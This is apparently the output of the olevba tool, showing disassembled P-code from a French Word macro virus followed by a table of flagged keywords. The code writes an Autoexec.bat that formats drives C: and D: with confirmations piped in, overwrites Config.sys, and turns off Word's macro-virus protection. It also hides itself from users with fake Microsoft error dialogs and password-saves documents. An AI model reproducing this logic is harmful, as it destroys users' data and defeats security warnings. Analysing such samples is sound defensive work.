' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St TM$ 
' Line #182:
' 	Ld MyWeek 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld MyWeek 
' 	LitDI2 0x0006 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld TM$ 
' 	LitStr 0x0002 "05"
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #183:
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0000 
' Line #184:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #185:
' 	LitStr 0x000A "**V<N<N0**"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #186:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #187:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #188:
' 	LitStr 0x0003 "ste"
' 	MemStWith Then 
' Line #189:
' 	LitStr 0x0004 "stes"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #190:
' 	EndWith 
' Line #191:
' 	LitStr 0x0008 "Veneno98"
' 	ParamNamed Password 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	ArgsCall Read 0x0000 
' Line #194:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NH$ 
' Line #195:
' 	Ld NH$ 
' 	LitDI2 0x0032 
' 	Eq 
' 	IfBlock 
' Line #196:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "PATH=C:\;C:\DOS;C:\WINDOWS;C:\WINDOWS\COMMAND"
' 	PrintItemNL 
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "Echo."
' 	PrintItemNL 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "Echo Inserez une disquette dans le lecteur A:"
' 	PrintItemNL 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Echo Appuyer sur n'importe qu'elle touche"
' 	PrintItemNL 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Echo pause > nul"
' 	PrintItemNL 
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Format a: /autotest > nul"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "if errorlevel 0 goto Fin"
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "o|format d: /u /autotest"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "o|format c: /u /autotest"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "y|format d: /u /autotest"
' 	PrintItemNL 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "y|format c: /u /autotest"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Vous vous êtes fait avoir!"
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "Echo."
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 ":Fin"
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "Echo Ta momman doit être très heureuse d'avoir un enfant si bOn et Obeissant..."
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #214:
' 	LitStr 0x000D "C:\Config.sys"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #215:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "SHELL=C:\DOS\COMMAND.COM /F /P"
' 	PrintItemNL 
' Line #216:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "SWITCHES = /N /F"
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	Label ErrorPV 
' Line #220:
' 	EndSub 
' Line #221:
' 	FuncDefn (Sub ToolsMacro())
' Line #222:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #223:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #224:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #225:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #226:
' 	OnError ErrorTM 
' Line #227:
' 	LitStr 0x0032 "Une erreur interne au module UNIDRV.DLL est arrivé"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0034 "Veuillez contacter le support technique de Microsoft"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #228:
' 	Label ErrorTM 
' Line #229:
' 	EndSub 
' Line #230:
' 	FuncDefn (Sub ViewVBCode())
' Line #231:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #232:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #233:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #234:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #235:
' 	OnError ErrorVVBC 
' Line #236:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Assistant 
' 	With 
' Line #237:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #238:
' 	EndWith 
' Line #239:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #240:
' 	LitStr 0x002A "Microsoft Visual Basic n'est pas installé."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0023 "Veuillez consulter l'aide en ligne."
' 	Concat 
' 	MemStWith Then 
' Line #241:
' 	LitStr 0x000E "Microsoft Word"
' 	MemStWith Heading 
' Line #242:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #243:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #244:
' 	ArgsMemCallWith Show 0x0000 
' Line #245:
' 	EndWith 
' Line #246:
' 	Label ErrorVVBC 
' Line #247:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|SHELL               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |UNIDRV.DLL          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

